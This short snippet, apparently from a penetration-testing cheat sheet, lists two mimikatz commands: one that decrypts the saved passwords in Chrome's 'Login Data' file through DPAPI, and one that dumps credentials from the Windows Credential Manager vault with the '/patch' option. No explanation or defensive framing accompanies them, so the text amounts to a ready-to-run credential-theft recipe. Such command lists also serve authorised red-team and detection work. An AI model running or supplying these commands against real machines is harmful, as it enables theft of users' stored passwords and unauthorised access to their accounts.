mimikatz.exe "dpapi::chrome /in:\\"C:\\Users\\<USER>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\\"" "exit"

# Decrypt Windows Credential Manager vault
mimikatz.exe "vault::cred /patch" "exit"
